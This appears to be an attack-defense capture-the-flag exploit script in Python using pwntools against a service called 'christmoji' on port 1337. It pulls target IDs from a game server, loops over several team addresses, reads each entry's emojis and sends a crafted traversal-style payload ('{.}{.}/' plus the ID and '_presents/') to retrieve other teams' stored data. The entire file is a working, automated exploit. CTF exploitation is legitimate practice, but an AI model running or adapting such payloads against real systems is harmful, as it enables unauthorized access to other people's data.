#!/usr/local/bin/python3.9 
import sys
from pwn import *
import requests as req
import re

ips = ['10.80.5.2' , "10.80.2.2" , "10.80.1.2" , "10.80.4.2" ,"10.80.3.2"]

for ip in ips:
    data= req.get("http://10.10.10.10/api/client/attack_data")
    trees = data.json()
    for tree_id in trees["christmoji"][ip]:
        def craft_payload(tree_id: str, emojis: list[bytes]) -> bytes:
            return b'{.}{.}/' + tree_id.encode() + b'_presents/' + b''.join([b'{' + e + b'}' for e in emojis])

        r = remote(ip, 1337)
        r.recvuntil(b'> ')
        r.sendline(b'5')
        r.recvuntil(b': ')
        r.sendline(tree_id.encode())
        tree = r.recvuntil(b'\n\n')
        emojis = re.findall(rb'\<([^\>]*)\>', tree)
        print(emojis)
        r.recvuntil(b'> ')
        r.sendline(b'5')
        r.recvuntil(b': ')
        r.sendline(craft_payload(tree_id, emojis))
        a = r.recvuntil(b'\n\n').decode()
        print(a, flush=True)